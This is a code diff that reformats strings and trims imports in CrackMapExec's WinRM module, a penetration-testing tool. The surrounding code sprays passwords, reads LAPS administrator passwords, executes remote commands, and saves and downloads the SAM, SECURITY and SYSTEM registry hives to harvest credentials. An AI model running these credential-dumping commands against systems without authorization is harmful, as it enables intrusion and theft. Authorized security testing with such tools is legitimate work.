@@ -5,28 +5,15 @@ import hashlib
 from datetime import datetime
 import os
 import requests
-from impacket.smbconnection import SMBConnection, SessionError
+from impacket.smbconnection import SMBConnection
 
 from cme.config import process_secret
 from cme.connection import *
-from cme.helpers.logger import highlight
 from cme.helpers.bloodhound import add_user_bh
 from cme.protocols.ldap.smbldap import LDAPConnect
 from cme.logger import CMEAdapter
 from pypsrp.client import Client
 from impacket.examples.secretsdump import LocalOperations, LSASecrets, SAMHashes
-import logging
-
-# The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
-# from requests.packages.urllib3.exceptions import InsecureRequestWarning
-#
-# requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-
-# class SuppressFilter(logging.Filter):
-#     # remove warning https://github.com/diyan/pywinrm/issues/269
-#     def filter(self, record):
-#         return "wsman" not in record.getMessage()
 
 
 class winrm(connection):
@@ -59,7 +46,10 @@ class winrm(connection):
         winrm_parser.add_argument(
             "--no-bruteforce",
             action="store_true",
-            help="No spray when using file for username and password (user1 => password1, user2 => password2",
+            help=(
+                "No spray when using file for username and password (user1 =>"
+                " password1, user2 => password2"
+            ),
         )
         winrm_parser.add_argument(
             "--continue-on-success",
@@ -273,7 +263,8 @@ class winrm(connection):
                 }
                 if "mslaps-encryptedpassword" in values:
                     self.logger.fail(
-                        "LAPS password is encrypted and currently CrackMapExec doesn't support the decryption..."
+                        "LAPS password is encrypted and currently CrackMapExec doesn't"
+                        " support the decryption..."
                     )
                     return False
                 elif "mslaps-password" in values:
@@ -286,7 +277,8 @@ class winrm(connection):
                     msMCSAdmPwd = values["ms-mcs-admpwd"]
                 else:
                     self.logger.fail(
-                        "No result found with attribute ms-MCS-AdmPwd or msLAPS-Password"
+                        "No result found with attribute ms-MCS-AdmPwd or"
+                        " msLAPS-Password"
                     )
             self.logger.debug(
                 "Host: {:<20} Password: {} {}".format(
@@ -295,9 +287,8 @@ class winrm(connection):
             )
         else:
             self.logger.fail(
-                "msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {}".format(
-                    self.hostname
-                )
+                "msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS"
+                " property for {}".format(self.hostname)
             )
             return False
 
@@ -306,9 +297,8 @@ class winrm(connection):
 
         if msMCSAdmPwd == "":
             self.logger.fail(
-                "msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for {}".format(
-                    self.hostname
-                )
+                "msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS"
+                " property for {}".format(self.hostname)
             )
             return False
         if ntlm_hash:
@@ -347,7 +337,8 @@ class winrm(connection):
                 self.logger.debug(f"winrm create_conn_obj() - Requesting URL: {url}")
                 res = requests.post(url, verify=False, timeout=self.args.http_timeout)
                 self.logger.debug(
-                    f"winrm create_conn_obj() - Received response code: {res.status_code}"
+                    "winrm create_conn_obj() - Received response code:"
+                    f" {res.status_code}"
                 )
                 self.endpoint = url
                 if self.endpoint.startswith("https://"):
@@ -526,7 +517,8 @@ class winrm(connection):
             r = self.conn.execute_cmd(self.args.execute)
         except:
             self.logger.info(
-                "Cannot execute command, probably because user is not local admin, but powershell command should be ok!"
+                "Cannot execute command, probably because user is not local admin, but"
+                " powershell command should be ok!"
             )
             r = self.conn.execute_ps(self.args.execute)
         self.logger.success("Executed command")
@@ -539,7 +531,8 @@ class winrm(connection):
 
     def sam(self):
         self.conn.execute_cmd(
-            "reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM"
+            "reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM"
+            " C:\\windows\\temp\\SYSTEM"
         )
         self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
         self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
@@ -560,7 +553,8 @@ class winrm(connection):
 
     def lsa(self):
         self.conn.execute_cmd(
-            "reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM"
+            "reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM"
+            " C:\\windows\\temp\\SYSTEM"
         )
         self.conn.fetch(
             "C:\\windows\\temp\\SECURITY", f"{self.output_filename}.security"
